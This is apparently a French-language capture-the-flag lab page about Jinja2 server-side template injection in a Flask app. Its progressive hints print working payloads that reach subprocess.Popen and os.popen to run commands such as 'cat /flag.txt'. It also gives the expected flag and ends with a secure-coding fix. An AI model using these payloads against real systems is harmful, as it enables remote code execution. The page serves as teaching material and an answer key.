VulnLab C03

Challenge C03

Python 3.11 · Flask · Jinja2

L'application utilise render_template_string() pour générer les rapports en injectant directement l'input utilisateur dans un template Jinja2. L'objectif est d'obtenir une Remote Code Execution et de lire /flag.txt.

Comprendre la vulnérabilité

📖

En Jinja2, {{ "{{" }} expression {{ "}}" }} évalue du code Python. Si l'input utilisateur est passé directement à render_template_string() (et non en tant que variable), l'attaquant contrôle le template lui-même.

# ❌ Vulnérable — l'input EST le template render_template_string(template_contenant_input_utilisateur) # ✅ Sécurisé — l'input est une variable du template render_template_string("Bonjour {{ name }}", name=user_input)

Indices progressifs

Indice 1 — Détecter la SSTI

Dans le champ Corps du rapport, testez une expression mathématique :

{{ "{{" }} 7*7 {{ "}}" }}

Si la page affiche 49 (et non {{ "{{7*7}}" }}), le moteur Jinja2 évalue vos expressions. La vulnérabilité est confirmée.

Indice 2 — Explorer les objets Python

Jinja2 donne accès à la hiérarchie des classes Python via __class__ et __mro__. Commencez à remonter l'arbre des objets :

{{ "{{" }} ''.__class__ {{ "}}" }} {{ "{{" }} ''.__class__.__mro__ {{ "}}" }} {{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}

La dernière expression liste toutes les sous-classes de object chargées en mémoire — cherchez subprocess.Popen dans la liste.

Indice 3 — Trouver l'index de Popen

L'index de subprocess.Popen varie selon l'environnement. Pour le trouver automatiquement :

{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() | selectattr('__name__', 'eq', 'Popen') | list {{ "}}" }}

Ou en listant avec index pour le repérer visuellement (cherchez Popen) :

{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[400:450] {{ "}}" }}
Indice 4 — Exécution de commande (RCE)

Une fois l'index de Popen connu (ici INDEX), exécutez une commande shell :

{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[INDEX](['cat','/flag.txt'],stdout=-1).communicate()[0].decode() {{ "}}" }}

Remplacez INDEX par le bon numéro. Vous pouvez aussi utiliser :

{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[INDEX](['id'],stdout=-1).communicate() {{ "}}" }} {{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[INDEX](['ls','/'],stdout=-1).communicate() {{ "}}" }}
Indice 5 — Payload alternatif via config

Flask expose l'objet config dans le contexte Jinja2. On peut aussi passer par lipsum, un global Jinja2 :

{{ "{{" }} config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() {{ "}}" }} {{ "{{" }} lipsum.__globals__['os'].popen('id').read() {{ "}}" }}

Ces payloads sont souvent plus courts et ne dépendent pas d'un index.

Flag attendu

FLAG{sst1_j1nj4_rc3_p0wn3d}

Correction (code sécurisé)

# ✅ Ne jamais passer l'input utilisateur comme template # Toujours l'injecter en tant que VARIABLE # Mauvais : render_template_string(f"Bonjour {user_input}") # Bon : render_template_string("Bonjour {{ name }}", name=user_input) # Encore mieux : utiliser des fichiers de template statiques render_template('report.html', title=title, body=body) # Et échapper explicitement les variables dans le template : # {{ body | e }} ← force l'échappement HTML
